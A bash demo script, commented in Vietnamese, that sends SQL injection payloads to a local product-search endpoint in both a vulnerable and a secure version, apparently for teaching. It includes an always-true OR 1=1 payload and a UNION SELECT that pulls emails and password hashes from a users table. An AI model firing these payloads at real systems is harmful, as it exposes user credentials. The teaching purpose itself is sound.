#!/usr/bin/env bash
# Demo 2: SQL Injection ở ô tìm kiếm sản phẩm (chỉ chạy trên demo local này)
source "$(dirname "$0")/lib.sh"

for BASE in "$VULN" "$SECURE"; do
  echo
  echo "################ $BASE ################"

  echo
  echo "--- Tìm kiếm bình thường: 'áo' ---"
  req -G "$BASE/products" --data-urlencode "search=áo"

  echo
  echo "--- Payload 1: ' OR 1=1 --   (điều kiện luôn đúng -> trả về cả bảng) ---"
  req -G "$BASE/products" --data-urlencode "search=' OR 1=1 --"

  echo
  echo "--- Payload 2: UNION lấy dữ liệu từ bảng users (email và chuỗi băm mật khẩu) ---"
  req -G "$BASE/products" --data-urlencode "search=' UNION SELECT id, email, password_hash, 0, 0 FROM users --"

  echo
  echo "--- Payload 3: một dấu nháy đơn, xem lỗi trả về có lộ chi tiết SQL không ---"
  req -G "$BASE/products" --data-urlencode "search='"
done
